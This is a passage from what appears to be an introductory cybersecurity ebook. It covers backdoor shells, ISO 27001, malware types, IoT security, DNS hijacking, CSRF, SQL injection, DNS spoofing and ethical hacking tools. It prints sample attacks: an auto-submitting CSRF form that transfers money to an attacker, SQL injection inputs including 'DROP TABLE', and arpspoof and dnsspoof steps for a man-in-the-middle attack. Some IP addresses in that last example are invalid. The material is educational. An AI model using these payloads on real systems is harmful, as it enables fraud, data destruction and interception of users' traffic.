+<p>Hackers usually look for targets using scanners; they identify websites with outdated or unpatched components that allow file injection. When a scanner is successful, it uses the susceptibility to install the backdoor into the underlying server. After it has been installed, the attacker can access it whenever he wants, even long after the vulnerability has been patched. In most cases, a backdoor Trojan injection is carried out in two steps to bypass security regulations that limit the upload of files exceeding a certain size. In the first step, a dropper is installed—this is a small file that is solely used to obtain the bigger file. The second step is then initiated, and it involves downloading and installing the backdoor script into the server.</p>
+<p>Backdoor Shell Removal: The Challenge</p>
+<p>Backdoors are not easy to weed out. Generally, detection is performed using a software scanner to identify known malware signatures in a system. This method is prone to error. Backdoor shells are hidden by using code obfuscation and alias names. In other cases, multiple layers of encryption are used. Detection is anything but simple because many applications are created on external frameworks (which use third-party plugins). Sometimes these plugins are laden with built-in backdoors or vulnerabilities. Scanners that depend on signature-based and heuristic rules are not efficient at identifying hidden codes in frameworks like these.</p>
+<p>Even after a scanner has detected a backdoor, it will be difficult to eliminate it from an application using typical mitigation tactics. This is especially true if the backdoor has a recurring presence in rewritable memory.</p>
+<p>Reducing Backdoor Shell Attacks with Imperva</p>
+<p>Imperva uses a combination of tried and tested methods to block backdoor installation, as well as detect and seclude any existing backdoor shells. The Imperva WAF (web application firewall) combines user-defined and default security rules to stop RFI attacks from infecting your application. This WAF is deployed at your network’s edge and blocks any malicious requests before they can interact with your app. If you already have a compromised web server, Imperva has a backdoor protection solution that will detect and eliminate shells from your system.</p>
+<p><span id="c020.xhtml"></span></p>
+<table>
+<colgroup>
+<col style="width: 33%" />
+<col style="width: 33%" />
+<col style="width: 33%" />
+</colgroup>
+<tbody>
+<tr class="odd">
+<td><div class="chapter-title-corner-decoration-left-column">
+<img src="d2d_images/chapter_title_corner_decoration_left.png" alt="image" class="chapter-title-corner-decoration-left" />
+</div></td>
+<td></td>
+<td><div class="chapter-title-corner-decoration-right-column">
+<img src="d2d_images/chapter_title_corner_decoration_right.png" alt="image" class="chapter-title-corner-decoration-right" />
+</div></td>
+</tr>
+</tbody>
+</table>
+<div class="chapter-title">
+<div class="chapter-title-decoration-above">
+<div class="chapter-title-decoration-above-inner">
+<img src="d2d_images/chapter_title_above.png" alt="image" class="chapter-title-decoration-above" />
+</div>
+</div>
+<h1 class="chapter-title">Chapter 16</h1>
+<h1>ISO/IEC 27001</h1>
+<div class="chapter-title-decoration-below">
+<div class="chapter-title-decoration-below-inner">
+<img src="d2d_images/chapter_title_below.png" alt="image" class="chapter-title-decoration-below" />
+</div>
+</div>
+</div>
+<p><span class="first-chapter-phrase"><span class="first-in-chapter character-i">I</span>t is also referred</span> to as ISO 27001 and is a security standard that shows the suggested requirements for creating, tracking, and enhancing an ISMS (information security management system). An ISMS is a collection of policies that manage and protect the sensitive information of an enterprise. ISO 27001 is employed voluntarily by service providers to ensure that customer information is secure. An accredited and independent body must formally audit a body to confirm compliance. There are benefits associated with working with a service provider that is ISO 27001 certified: Risk management: an ISMS regulates who can access certain information. The risk of that information being compromised is lowered. Information security: an ISMS has protocols of information management specifying how certain data is to be handled. Business continuity: the ISMS of a service provider must be tested continuously and improved so it can continue to be ISO 27001 compliant. This prevents data from being breached. ISO 27001 compliance is crucial in creating a policy of information security governance. The process of building an ISO compliant ISMS is comprehensive and includes support, training, planning, and scoping. Before a business can be certified, there are important elements that must be addressed.</p>
+<p>Organizational Context</p>
+<p>Any issues, external or internal, that may hinder an enterprise from building an ISMS such as information security, contractual, legal, and regulatory obligations should be identified. The information obtained in the step above is used to outline the ISMS scope, documenting all relevant areas. After this, the ISMS is applied, maintained and improved continually according to ISO 27001 requirements. The scope shows the importance of incorporating the ISMS into the management process and structure. Thousands of organizations must adhere to these requirements. To maintain the ISMS, the management of an organization requires relevant leadership skills. They include continued improvement of the ISMS, incorporating the ISMS into processes of the organization, and coming up with a policy of information security in accordance with the business’s direction, among others. The ISMS process should include a plan for approaching risks posed to information security. It involves:</p>
+<div class="poetry">
+<p>●  Creating and implementing a detailed risk management process.</p>
+<p>●  Outlining and implementing a process of reducing threats.</p>
+</div>
+<p>The organization needs to acquire resources, infrastructure, and people that will implement an ISMS effectively. Support often involves mentoring and training staff on how to handle sensitive information. Employees should also be told how to contribute to make the ISMS more effective and what could happen if they do not adhere to the policies of information security.</p>
+<p>Operations is all about executing processes and plans that were defined in the above steps. The enterprise should document the actions taken to make sure that processes are carried out as planned. Performance evaluation ensures that the ISMS is improved constantly and continues to work effectively. It also looks for any areas that should be improved. Any nonconformities should be addressed as soon as they are discovered. Enterprises should also take necessary measures so that the issue does not recur.</p>
+<p><span id="c021.xhtml"></span></p>
+<table>
+<colgroup>
+<col style="width: 33%" />
+<col style="width: 33%" />
+<col style="width: 33%" />
+</colgroup>
+<tbody>
+<tr class="odd">
+<td><div class="chapter-title-corner-decoration-left-column">
+<img src="d2d_images/chapter_title_corner_decoration_left.png" alt="image" class="chapter-title-corner-decoration-left" />
+</div></td>
+<td></td>
+<td><div class="chapter-title-corner-decoration-right-column">
+<img src="d2d_images/chapter_title_corner_decoration_right.png" alt="image" class="chapter-title-corner-decoration-right" />
+</div></td>
+</tr>
+</tbody>
+</table>
+<div class="chapter-title">
+<div class="chapter-title-decoration-above">
+<div class="chapter-title-decoration-above-inner">
+<img src="d2d_images/chapter_title_above.png" alt="image" class="chapter-title-decoration-above" />
+</div>
+</div>
+<h1 class="chapter-title">Chapter 17</h1>
+<h1>Malware Types</h1>
+<div class="chapter-title-decoration-below">
+<div class="chapter-title-decoration-below-inner">
+<img src="d2d_images/chapter_title_below.png" alt="image" class="chapter-title-decoration-below" />
+</div>
+</div>
+</div>
+<p><span class="first-chapter-phrase"><span class="first-in-chapter character-m">M</span>alware is malicious</span> software dispatched by a perpetrator to infect an organization’s network or individual computers. It exploits vulnerabilities in a target’s system such as a bug. There are many types of malware and each has its area of focus and application. The seven most common include the following. When Ransomware is installed into a computer system and/or an entire network, it encrypts the files. The attacker informs the user through a popup display that the files will only be decrypted if a ransom is paid. Ransomware gets into a computer through a suspicious download or an email attachment. Originally, worms were made to infect systems, clone themselves, then infect other computers using another medium. Hackers create botnets using worms from many connected devices. Examples of worms include:</p>
+<div class="blockquote">
+<p>●  NgrBot: it arrives through social networking sites and chat messengers.</p>
+<p>●  ILOVEYOU: this one entices people using a fake love interest. The user may be encouraged to open an email infected with a worm.</p>
+</div>
+<p>Trojan is type of malware that masquerades as legitimate. Unlike worms, it does not replicate itself. However, it contains additional types of malware such as spyware, ransomware, rootkits, and backdoors. Trojan attacks like to target the banking industry. Typically, a malware is installed on the target computer via a software vulnerability.  When the user visits the site, a spoofed screen is overlaid requesting personal data such as credit card details. Rootkits are prepared and customizable. They give access to the sensitive sections of an applications, change the configurations of a system, and enable file execution. They are usually deployed via a social engineering attack (which may lead to the theft of login credentials) and when installed, the hacker is able to access a network. This malware subverts all anti-malware software— the perpetrator is then free to do whatever he or she wants. Flame is a great example of a rootkit. It was used to monitor network traffic, record keystrokes, and steal screenshots. Backdoors negates the normal authentication process used to access a network. It is always installed as part of a targeted attack. The perpetrator researches the victim and steals their login credentials via a social engineering attack and consequently, gains access to the network, system, or application. Backdoors often try to avoid being detected and attackers use them to establish a control center. The attacker can then initiate system commands and update malware remotely. Hackers use backdoors for all kinds of malicious activities including infection of visitors’ computers, denial of service, and data theft. It is also the first step undertaken by attackers when they want to execute an APT (advanced persistent threat). Adware is one of the oldest types of malware. It was a free software that had so many popup ads that kept appearing. It was not necessarily malware, but it was annoying— it still exists to this day. Spyware collects your personal data and sells it to a third-party (a perpetrator) without your consent.</p>
+<p><span id="c022.xhtml"></span></p>
+<table>
+<colgroup>
+<col style="width: 33%" />
+<col style="width: 33%" />
+<col style="width: 33%" />
+</colgroup>
+<tbody>
+<tr class="odd">
+<td><div class="chapter-title-corner-decoration-left-column">
+<img src="d2d_images/chapter_title_corner_decoration_left.png" alt="image" class="chapter-title-corner-decoration-left" />
+</div></td>
+<td></td>
+<td><div class="chapter-title-corner-decoration-right-column">
+<img src="d2d_images/chapter_title_corner_decoration_right.png" alt="image" class="chapter-title-corner-decoration-right" />
+</div></td>
+</tr>
+</tbody>
+</table>
+<div class="chapter-title">
+<div class="chapter-title-decoration-above">
+<div class="chapter-title-decoration-above-inner">
+<img src="d2d_images/chapter_title_above.png" alt="image" class="chapter-title-decoration-above" />
+</div>
+</div>
+<h1 class="chapter-title">Chapter 18</h1>
+<h1>Internet of Things Security</h1>
+<div class="chapter-title-decoration-below">
+<div class="chapter-title-decoration-below-inner">
+<img src="d2d_images/chapter_title_below.png" alt="image" class="chapter-title-decoration-below" />
+</div>
+</div>
+</div>
+<p><span class="first-chapter-phrase"><span class="first-in-chapter character-i">I</span>oT is a network of</span> devices that are connected. Each of them has a unique identifier which exchanges and collects data automatically over a network. There are many industries and sectors that use IoT devices such as: Consumer applications: some IoT consumer products include smart homes, smart watches, and smartphones. Business applications: these include sensors, smart trackers, and smart security cameras. Governmental applications: these include devices that track wildlife, issue alerts for natural disasters, and monitor traffic congestions. The widespread use of IoT devices has opened a door for security issues which are discussed here in detail. IoT Devices are managed both externally (interaction with other devices) and internally (software maintenance). Every device is connected to a command and control center(C&amp;C) which is the management unit. These centers take care of firmware updates, configurations, and software maintenance. They are also responsible for authentication of tasks. Communication between IoT devices are through APIs (application program interfaces). When the API of a device is exposed, other applications or devices can gather data through it and communicate.</p>
+<p>IoT Security Issues and Vulnerabilities</p>
+<p>APIs and C&amp;C centers manage daily IoT operations effectively. Because they are centralized in nature, they have several exploitable weak spots such as: Unpatched vulnerabilities: devices, in most cases, run on outdated software because end-users are required to download updates manually and connectivity issues. This leaves them vulnerable to newly discovered threats. Weak authentication: IoT devices such as home routers usually have easily decipherable passwords. This makes them an easy target for automated scripts from hackers. Vulnerable APIs: some of the major threats that target APIs include distributed denial of service (DDoS), code injections, and Man in the Middle (MITM). These dangers can be divided into two categories: threats to users and threats to others. Data theft: an IoT device has so much data which, in most cases, is unique to the individual user. The data may be credit card details, personal health information, etc. Physical harm: IoT devices are becoming more common in the medical space. Some of them include defibrillators and pacemakers. When these devices are interfered with, the medical care of a patient can be negatively affected. A vulnerable IoT device can be infiltrated and used in a botnet. Unprotected devices are not hard to discover for perpetrators. The threats posed to IoT devices have become more sophisticated and this has led to a multitude of cyberattacks. There are billions of IoT devices and, therefore, their security should be highly prioritized. Device users should adhere to security practices such as blocking remote access (if it not necessary) and changing default passwords.</p>
+<p>Device manufacturers and vendors should be more vigilant and invest in IoT management tools. They should take the following steps:</p>
+<div class="poetry">
+<p>●  Notify users about outdated software.</p>
+<p>●  Emphasize on smart password management.</p>
+<p>●  Disable unnecessary remote access.</p>
+<p>●  Make sure APIs have strict access control policy.</p>
+<p>●  Reinforce the security of C&amp;C centers.</p>
+</div>
+<p><span id="c023.xhtml"></span></p>
+<table>
+<colgroup>
+<col style="width: 33%" />
+<col style="width: 33%" />
+<col style="width: 33%" />
+</colgroup>
+<tbody>
+<tr class="odd">
+<td><div class="chapter-title-corner-decoration-left-column">
+<img src="d2d_images/chapter_title_corner_decoration_left.png" alt="image" class="chapter-title-corner-decoration-left" />
+</div></td>
+<td></td>
+<td><div class="chapter-title-corner-decoration-right-column">
+<img src="d2d_images/chapter_title_corner_decoration_right.png" alt="image" class="chapter-title-corner-decoration-right" />
+</div></td>
+</tr>
+</tbody>
+</table>
+<div class="chapter-title">
+<div class="chapter-title-decoration-above">
+<div class="chapter-title-decoration-above-inner">
+<img src="d2d_images/chapter_title_above.png" alt="image" class="chapter-title-decoration-above" />
+</div>
+</div>
+<h1 class="chapter-title">Chapter 19</h1>
+<h1>Domain Name Server (DNS) Hijacking</h1>
+<div class="chapter-title-decoration-below">
+<div class="chapter-title-decoration-below-inner">
+<img src="d2d_images/chapter_title_below.png" alt="image" class="chapter-title-decoration-below" />
+</div>
+</div>
+</div>
+<p><span class="first-chapter-phrase"><span class="first-in-chapter character-d">D</span>NS hijacking (or DNS</span> redirection) is a DNS attack where DNS queries are resolved incorrectly so that users can be unexpectedly redirected to malicious sites. For them to carry out the attack, the bad actor can install malware on the victim’s PC, hack/intercept DNS communication, or take over routers. Attackers use DNS hijacking for phishing or pharming. DNS hijacking is also used by many ISPs (Internet Service Providers) to take over the DNS requests of a user and gather statistics. DNS hijacking is also used by governments for censorship—users are redirected to government sites that are authorized. There are four main forms of DNS redirection: Local DNS hijack: the perpetrator installs Trojan malware on the computer of the victim. He then tweaks the local DNS settings, so the victim is redirected to malicious sites. Router DNS hijack: most routers have firmware vulnerabilities or default passwords. When an attacker takes over a router, he can overwrite the DNS settings which affects all the users that are connected to the router. Man in the middle DNS attacks: a perpetrator intercepts communication between a DNS server and a user then gives another destination IP address that points to a malicious site. Rogue DNS Server: the perpetrator hacks a DNS server and tweaks DNS records. Consequently, DNS requests are redirected to malicious sites. A DNS spoofing attack occurs when an attacker redirects traffic from a legitimate site to a malicious site. DNS spoofing can be carried out using DNS redirection. For instance, by compromising a DNS server, attackers can spoof legitimate websites then redirect the users to other malicious sites. Cache poisoning can also be used to execute DNS spoofing without the need to rely on DNS hijacking.  A bad actor can put in an illegitimate DNS entry and poison the DNS cache. This entry contains an alternative IP destination. Until the cache is refreshed, the domain is resolved to the spoofed website. Strong security measures are required for a DNS name server since it is a very sensitive infrastructure. Hackers can hijack it and use it to execute DDoS attacks. Resolvers on the network: shut down any DNS resolvers that are not needed. As for the legitimate resolvers, ensure that they are behind a firewall and inaccessible from outside. Access to name servers should be restricted: use network security measures, firewall, physical security, and multi-factor access. Take caution against cache poisoning: lower/upper case in domain names and query ID should be randomized and try to use a random port source. Take care of known vulnerabilities: attackers are always looking for susceptible DNS servers. Resolver should be separated from authoritative name server: the two should not be run on the same server. Ensure that zone transfers are restricted. For end users, actions such as installing antivirus, changing router passwords, and use an encrypted VPN channel will protect them from DNS hijacking.</p>
+<p>Mitigation for Site Owners</p>
+<p>Steps to take:</p>
+<div class="poetry">
+<p>●  DNSSEC</p>
+<p>●  Client lock</p>
+<p>●  Secure access</p>
+</div>
+<p><span id="c024.xhtml"></span></p>
+<table>
+<colgroup>
+<col style="width: 33%" />
+<col style="width: 33%" />
+<col style="width: 33%" />
+</colgroup>
+<tbody>
+<tr class="odd">
+<td><div class="chapter-title-corner-decoration-left-column">
+<img src="d2d_images/chapter_title_corner_decoration_left.png" alt="image" class="chapter-title-corner-decoration-left" />
+</div></td>
+<td></td>
+<td><div class="chapter-title-corner-decoration-right-column">
+<img src="d2d_images/chapter_title_corner_decoration_right.png" alt="image" class="chapter-title-corner-decoration-right" />
+</div></td>
+</tr>
+</tbody>
+</table>
+<div class="chapter-title">
+<div class="chapter-title-decoration-above">
+<div class="chapter-title-decoration-above-inner">
+<img src="d2d_images/chapter_title_above.png" alt="image" class="chapter-title-decoration-above" />
+</div>
+</div>
+<h1 class="chapter-title">Chapter 20</h1>
+<h1>Cross Site Request Forgery (CSRF) Attack</h1>
+<div class="chapter-title-decoration-below">
+<div class="chapter-title-decoration-below-inner">
+<img src="d2d_images/chapter_title_below.png" alt="image" class="chapter-title-decoration-below" />
+</div>
+</div>
+</div>
+<p><span class="first-chapter-phrase"><span class="first-in-chapter character-c">C</span>SRF (otherwise known</span> as Session Riding, Sea Surf or XSRF) is a kind of an attack that manipulates a web browser into carrying out an undesired action in the application that a user is logged on to.  When a CSRF attack is successful, both the user and the business are affected. It can lead to unauthorized transfer of funds, data theft (including session cookies), changed passwords, or damaged relationships with clients. CSRFs are usually executed using social engineering attacks such as links or emails that manipulate the user into sending a counterfeit request to the server. The application authenticates the unsuspecting user during the attack—this makes it difficult to tell the difference between a forged request and a legitimate one.</p>
+<p>Example of a CSRF Attack</p>
+<p>A perpetrator takes some time to study an application so that the request can look just like a legitimate one. Take the example of a GET request for say, a $200 bank transfer. It will typically look like this: GET <span style="text-decoration: underline">http://netbank.com/transfer.do?acct=PersonB&amp;amount=$200</span> HTTP/1.1</p>
+<p>A perpetrator may tweak this script and transfer t$200 to his account. The malicious request may be something like this: GET <span style="text-decoration: underline">http://netbank.com/transfer.do?acct=AttackerA&amp;amount=$200</span> HTTP/1.1</p>
+<p>The attacker may then embed this request into a link that seems very innocent:</p>
+<p>&lt;a href=” <span style="text-decoration: underline">http://netbank.com/transfer.do?acct=AttackerA&amp;amount=$200</span>”&gt;Read more! &lt;/a&gt;</p>
+<p>The next step for the bad actor is to send out this link to as many bank customers as possible via email. Anyone who clicks through while signed into their bank account may end up unintentionally transferring $200 to the hacker. A malicious request carried out using the &lt;a&gt; href tag cannot be successful if the bank only uses POST requests. Nonetheless, the attacker can still use a &lt;form&gt; tag together with automatic execution of an embedded JavaScript.</p>
+<p>For example:</p>
+<p>&lt;body onload="document.forms[0].submit()"&gt;</p>
+<p>&lt;form action="http://netbank.com/transfer.do" method="POST"&gt;</p>
+<p>&lt;input type="hidden" name="acct" value="AttackerA"/&gt;</p>
+<p>&lt;input type="hidden" name="amount" value="$100"/&gt;</p>
+<p>&lt;input type="submit" value="View my pictures!"/&gt;</p>
+<p>&lt;/form&gt;</p>
+<p>&lt;/body&gt;</p>
+<p>There are several methods through which CSRF attacks can be prevented and mitigated. For users, a CSRF attack can be prevented by denying access to unauthorized actors in applications and safeguarding their login credentials.</p>
+<p>Here are a few great practices:</p>
+<div class="poetry">
+<p>●  Secure passwords and usernames</p>
+<p>●  Log off from web applications when they are not in use</p>
+<p>●  Prevent browsers from remembering passwords</p>
+<p>●  Avoid browsing simultaneously when signed into an application</p>
+</div>
+<p>Web applications can also take advantage of the solutions available to block malicious traffic and stop attacks. One common method of mitigation is creating random tokens for each ID or session request. The server subsequently checks and verifies them. Any session requests with missing values or duplicate tokens are blocked. If a request does not match the token of its session ID, it is also blocked from getting to the application. CSRF attacks can also be blocked using the method of double submission of cookies. Just like with the method described above, both a request parameter and cookies are assigned random tokens. Before access to the application is granted, the server must make sure that the tokens match. Tokens are not 100% effective.</p>
+<p><span id="c025.xhtml"></span></p>
+<table>
+<colgroup>
+<col style="width: 33%" />
+<col style="width: 33%" />
+<col style="width: 33%" />
+</colgroup>
+<tbody>
+<tr class="odd">
+<td><div class="chapter-title-corner-decoration-left-column">
+<img src="d2d_images/chapter_title_corner_decoration_left.png" alt="image" class="chapter-title-corner-decoration-left" />
+</div></td>
+<td></td>
+<td><div class="chapter-title-corner-decoration-right-column">
+<img src="d2d_images/chapter_title_corner_decoration_right.png" alt="image" class="chapter-title-corner-decoration-right" />
+</div></td>
+</tr>
+</tbody>
+</table>
+<div class="chapter-title">
+<div class="chapter-title-decoration-above">
+<div class="chapter-title-decoration-above-inner">
+<img src="d2d_images/chapter_title_above.png" alt="image" class="chapter-title-decoration-above" />
+</div>
+</div>
+<h1 class="chapter-title">Chapter 21</h1>
+<h1>Structured Query Language (SQL) Injection</h1>
+<div class="chapter-title-decoration-below">
+<div class="chapter-title-decoration-below-inner">
+<img src="d2d_images/chapter_title_below.png" alt="image" class="chapter-title-decoration-below" />
+</div>
+</div>
+</div>
+<p><span class="first-chapter-phrase"><span class="first-in-chapter character-s">S</span>QL injection or SQLI</span> is where a malicious SQL code is used to manipulate backend database in order to access sensitive information (private customer details, user lists, etc.). SQL injection can have quite the impact on a business. If an attack like this one is successful, user lists can be viewed by unauthorized persons, entire tables could be deleted, and in extreme cases, the perpetrator may attain admin rights to a database.  When talking about the loss that an organization may incur due to SQLI, it is important to mention damaged relationships with customers should their personal information (credit card details, addresses, and phone numbers) be stolen. Any SQL database can suffer this attack, but websites are the most targeted. SQL is standardized language for accessing and manipulating databases for the purpose of creating customizable views for every user. SQL queries help in executing commands like record removal, data retrieval, and updates. There are different SQL elements that are used to carry out these tasks. The following is a typical SQL database query of an eStore:</p>
+<p>SELECT ItemName, ItemDescription</p>
+<p>FROM Item</p>
+<p>WHERE ItemNumber = ItemNumber</p>
+<p>From this query, the web application creates a string query and sends it to the database as one SQL statement:</p>
+<p>sql_query= "</p>
+<p>SELECT ItemName, ItemDescription</p>
+<p>FROM Item</p>
+<p>WHERE ItemNumber = " &amp; Request.QueryString("ItemID")</p>
+<p>An input provided by a user http://www.estore.com/items/items.asp?itemid=999 then develops this query:</p>
+<p>SELECT ItemName, ItemDescription</p>
+<p>FROM Item</p>
+<p>WHERE ItemNumber = 999</p>
+<p>From the syntax, you can see that this query gives the description of item number 999.</p>
+<p>SQL Injection Example</p>
+<p>When a perpetrator wants to carry out an SQLI, he uses a typical SQL query to take advantage of input vulnerabilities that have not been validated in a database. An attacker can execute this attack vector in several ways, some of which are illustrated here. The input mentioned above, for example, extracts information about a specific product. It can be changed to http://www.estore.com/items/items.asp?itemid=999 or 1=1</p>
+<p>The corresponding SQL query will then be:</p>
+<p>SELECT ItemName, ItemDescription</p>
+<p>FROM Items</p>
+<p>WHERE ItemNumber = 999 OR 1=1</p>
+<p>1=1 is a statement that is always true so the query will return every item name and description from the database, including those that you are not allowed to access.</p>
+<p>Perpetrators can also exploit characters that have been incorrectly filtered to change SQL commands—this includes semicolons to separate fields. For instance, this input http://www.estore.com/items/iteams.asp?itemid=999; DROP TABLE Users will generate this SQL query:</p>
+<p>SELECT ItemName, ItemDescription</p>
+<p>FROM Items</p>
+<p>WHERE ItemNumber = 999; DROP TABLE USERS</p>
+<p>This could lead to deletion of the user database.</p>
+<p>SQLI Mitigation and Prevention</p>
+<p>You can prevent SQLI attacks from happening in multiple ways and protect against them if they occur.</p>
+<p>Some of the best ways include:</p>
+<p>Input sanitization/validation – write code that can recognize use inputs that are illegitimate. This is a good practice, but it is still not 100% effective. WAF (web application firewall) – this one filters out SQLI among other online threats.</p>
+<p><span id="c026.xhtml"></span></p>
+<table>
+<colgroup>
+<col style="width: 33%" />
+<col style="width: 33%" />
+<col style="width: 33%" />
+</colgroup>
+<tbody>
+<tr class="odd">
+<td><div class="chapter-title-corner-decoration-left-column">
+<img src="d2d_images/chapter_title_corner_decoration_left.png" alt="image" class="chapter-title-corner-decoration-left" />
+</div></td>
+<td></td>
+<td><div class="chapter-title-corner-decoration-right-column">
+<img src="d2d_images/chapter_title_corner_decoration_right.png" alt="image" class="chapter-title-corner-decoration-right" />
+</div></td>
+</tr>
+</tbody>
+</table>
+<div class="chapter-title">
+<div class="chapter-title-decoration-above">
+<div class="chapter-title-decoration-above-inner">
+<img src="d2d_images/chapter_title_above.png" alt="image" class="chapter-title-decoration-above" />
+</div>
+</div>
+<h1 class="chapter-title">Chapter 22</h1>
+<h1>DNS Spoofing</h1>
+<div class="chapter-title-decoration-below">
+<div class="chapter-title-decoration-below-inner">
+<img src="d2d_images/chapter_title_below.png" alt="image" class="chapter-title-decoration-below" />
+</div>
+</div>
+</div>
+<p><span class="first-chapter-phrase"><span class="first-in-chapter character-d">D</span>NS (Domain Name Server</span>) spoofing is also known as DNS cache poisoning. It is an attack that uses changed DNS records to redirect traffic to a malicious website instead of the intended one. This fraudulent site looks so much like the legitimate one. Once they are in the attacker’s site, the victim is prompted to sign in to what looks like their account. During this event, the bad actor steals the user’s sensitive information and login credentials. Moreover, the attacker can install viruses or worms on the user’s computer, achieving long-term access to other kinds of data.  A DNS spoofing attack can be executed using certain methods including: Man in the middle (MITM): this is whereby a perpetrator intercepts communication between a DNS server and a user and, consequently, routes the victim to a fraudulent IP address. DNS server compromise: this is where an attacker directly hijacks a DNS server and configures it to return a fraudulent IP address. In this example, the perpetrator (whose IP is 192.168.6.300) intercepts a channel of communication between the server computer of www.estores.com (whose IP is 192.168.4.200) and their client (whose IP is 192.168.1.100). In this case, the client is tricked using a tool such as arpspoof to think that the attacker’s IP address is the servers. In the same way, the server is tricked into believing that the attacker’s IP address is the client’s This is how that would play out: The perpetrator issues this command using arpspoof “arpspoof 192.168.1.100 192.168.2.200”. The MAC IP addresses in the ARP table of the server are modified so it thinks that the PC of the perpetrator is the client. Again, the attacker issues this command using arpspoof “arpspoof 192.168.2.200 192.168.1.100”. This makes the client think that the perpetrator’s PC belongs to the server. The next step for the perpetrator is to issue a Linux command “echo 1&gt; /proc/sys/net/ipv4/ip forward so that the packets that are exchanged between the server and the client are forwarded to the computer of the attacker. The perpetrator creates the host file, estores.com 192.168.3.300, on his local computer. It maps the legitimate website to his local IP. The attacker creates a web server on the IP address of the local computer and sets up a malicious website that looks like the legitimate one. Finally, the perpetrator uses a tool such as dnsspoof so all DNS requests are directed to his local host file. When users try to access the real website, the fake one comes up and when they interact with it, their computers get infected with malware. Mitigation of DNS Spoofing Using DNSSEC (Domain Name Server Security) DNS is a protocol that is not encrypted, and DNS servers never validate IP addresses when they redirect traffic. DNSSEC adds extra verification methods. It sets up a cryptographic signature that is unique to you to authenticate DNS responses. It is very effective but has a few downsides including:</p>
+<div class="poetry">
+<p>●  Does not offer data confidentiality</p>
+<p>●  Complex deployment</p>
+<p>●  Zone enumeration</p>
+</div>
+<p><span id="c027.xhtml"></span></p>
+<table>
+<colgroup>
+<col style="width: 33%" />
+<col style="width: 33%" />
+<col style="width: 33%" />
+</colgroup>
+<tbody>
+<tr class="odd">
+<td><div class="chapter-title-corner-decoration-left-column">
+<img src="d2d_images/chapter_title_corner_decoration_left.png" alt="image" class="chapter-title-corner-decoration-left" />
+</div></td>
+<td></td>
+<td><div class="chapter-title-corner-decoration-right-column">
+<img src="d2d_images/chapter_title_corner_decoration_right.png" alt="image" class="chapter-title-corner-decoration-right" />
+</div></td>
+</tr>
+</tbody>
+</table>
+<div class="chapter-title">
+<div class="chapter-title-decoration-above">
+<div class="chapter-title-decoration-above-inner">
+<img src="d2d_images/chapter_title_above.png" alt="image" class="chapter-title-decoration-above" />
+</div>
+</div>
+<h1 class="chapter-title">Chapter 23</h1>
+<h1>Ethical Hacking Tools</h1>
+<div class="chapter-title-decoration-below">
+<div class="chapter-title-decoration-below-inner">
+<img src="d2d_images/chapter_title_below.png" alt="image" class="chapter-title-decoration-below" />
+</div>
+</div>
+</div>
+<p><span class="first-chapter-phrase"><span class="first-in-chapter character-t">T</span>he rise of automatic</span> tools has seen a dramatic change in the world of penetration testing or ethical hacking. There are tools that are still being processed to help speed up the testing process. Ethical hacking provides a way for organizations to protect their systems and information. It is one of the best ways through which organizations can augment security professional skills. When ethical hacking is made a part of security measures, the company could reap tremendous benefits. Some of the tools commonly used in ethical hacking include: Nmap (Network Mapper) one of the best tools for hacking ever. It is used in a phase of ethical hacking known as port scanning. It was originally a command-line tool, but it was eventually modified for Unix- or Linux-based operating systems. Currently, Nmap has a Windows version. Nmap is a mapper for network security. It can discover hosts and services on a network and, consequently, develop a network map. There are several features offered by this software for the purpose of probing computer networks, detecting operating networks, and host discovery. It is script extensible and can, therefore, offer advanced detection of vulnerabilities and adapt to latency, congestion and other network conditions while scanning. Nessus is the most popular vulnerability scanner in the world. It was developed by tenable network security. Experts recommend it for non-enterprise use—it is also free. This scanner is very efficient and will find bugs on any network. Here are the vulnerabilities that can be detected by Nessus:</p>
+<div class="poetry">
+<p>●  Different system vulnerabilities</p>
+<p>●  Weak passwords—common and default</p>
+<p>●  Misconfiguration and unpatched services</p>
+</div>
+<p>Nikto web scanner scans and tests quite a number of web servers and identifies dangerous files or CGIs, outdated software, among other related issues. It can perform both generic and server-specific prints and checks by capturing cookies that have been received. This tool is free and open-source. It checks across 270 servers for version-specific problems and finds default files and programs. These are some of the main features of Nikto:</p>
+<p>Open source tool</p>
+<p>Checks misconfigured files and plugins</p>
+<p>Identifies insecure files and programs</p>
+<p>Scans servers for versions that are outdated and other version-specific issues</p>
+<p>Scans web servers to find potentially dangerous files or more than 6400 CGIs</p>
+<p>Kismet is the best for wardriving or hacking wireless LAN and testing wireless networks. It identifies networks, gathers packets, and identifies hidden and non-beaconing networks using data traffic. Basically, Kismet is a wireless network detector and sniffer. It supports raw-monitoring mode and works in conjunction with other wireless cards.  The following are some of the basic characteristics of Kismet:</p>
+<div class="poetry">
+<p>●  Sometimes applicable to Windows</p>
+<p>●  Runs on Linux OS</p>
+</div>
+<p>NetStumbler prevents wardriving. It works on Windows operating systems. It can detect three types of networks. It also has a newer version known as MiniStumbler.</p>
+<p>The following are uses of NetStumbler:</p>
+<div class="poetry">
+<p>●  Detects unauthorized access points</p>
+<p>●  Accesses strength of received signals</p>
+<p>●  Determines cause of interference</p>
+<p>●  Identifies Access Point (AP) network configuration</p>
+</div>
+<p><span id="c028.xhtml"></span></p>
+<table>
+<colgroup>
+<col style="width: 33%" />
+<col style="width: 33%" />
+<col style="width: 33%" />
+</colgroup>
+<tbody>
+<tr class="odd">
+<td><div class="chapter-title-corner-decoration-left-column">
+<img src="d2d_images/chapter_title_corner_decoration_left.png" alt="image" class="chapter-title-corner-decoration-left" />
+</div></td>
+<td></td>
+<td><div class="chapter-title-corner-decoration-right-column">
+<img src="d2d_images/chapter_title_corner_decoration_right.png" alt="image" class="chapter-title-corner-decoration-right" />
+</div></td>
+</tr>
+</tbody>
+</table>
+<div class="chapter-title">
+<div class="chapter-title-decoration-above">
+<div class="chapter-title-decoration-above-inner">
+<img src="d2d_images/chapter_title_above.png" alt="image" class="chapter-title-decoration-above" />
+</div>
+</div>
+<h1 class="chapter-title">Chapter 24</h1>
+<h1>Web Scraping</h1>
+<div class="chapter-title-decoration-below">
+<div class="chapter-title-decoration-below-inner">
+<img src="d2d_images/chapter_title_below.png" alt="image" class="chapter-title-decoration-below" />
+</div>
+</div>
+</div>
